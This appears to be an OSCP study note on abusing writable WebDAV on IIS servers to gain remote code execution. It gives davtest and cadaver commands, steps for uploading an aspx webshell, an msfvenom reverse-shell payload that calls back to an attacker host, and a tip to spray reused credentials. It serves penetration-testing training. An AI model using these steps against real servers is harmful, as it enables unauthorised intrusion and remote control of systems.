# WebDAV — File Upload over HTTP (OSCP)

**WebDAV = SMB over port 80.** A web server that also lets you **write** files
(`PUT`, `DELETE`, `MOVE`) instead of only serving them (`GET`). On **IIS**, if you
can PUT an executable script (`.aspx`) into a served folder → **RCE**.

> **Credential-reuse trigger:** if you already have a valid domain/local cred and
> port 80/443 is open, **WebDAV is another service to spray those creds at.** Don't
> tunnel-vision on SMB/WinRM — test the web surface too.

---
## 1. Test access + writability

```bash
davtest -url http://<IP>                     # auto-probe: what can I upload & execute?
davtest -url http://<IP> -auth user:password # with creds
```
`davtest` uploads test files of each extension and tells you which ones **execute** —
that's your answer for "which webshell will run."

---

## 2. Connect (like an FTP/SMB client)

```bash
cadaver http://<IP>            # anonymous
cadaver http://<IP>            # then enter user/pass when prompted
```
Inside cadaver:
```
ls
put shell.aspx        # upload
delete shell.aspx
```

---

## 3. Upload → shell (IIS = execute .aspx)

IIS runs `.aspx` server-side. Drop a webshell, then **browse to it** to trigger it.

**Preferred: command webshell first (no listener, confirms RCE):**
```bash
cp /usr/share/webshells/aspx/cmdasp.aspx ~/shell.aspx
# cadaver: put shell.aspx
# browse:  http://<IP>/shell.aspx  → run `whoami` in the form
```
Then upgrade to interactive by running a PowerShell reverse-shell one-liner in the form.

**Or: baked-in reverse shell (start `nc -lvnp 4444` first):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f aspx -o shell.aspx
# cadaver: put shell.aspx  → browse to it to fire the callback
```

> **Wrong extension = no shell.** `.txt`/`.jpg` just sit there. IIS → `.aspx`.
> Apache/PHP → `.php`. **Writable AND executable** = RCE.

---

## Related Notes
- [[SMB]]
- [[Port-Overview-and-Priorities]]
- [[ReverseShells]]
- [[File_Transfer]]
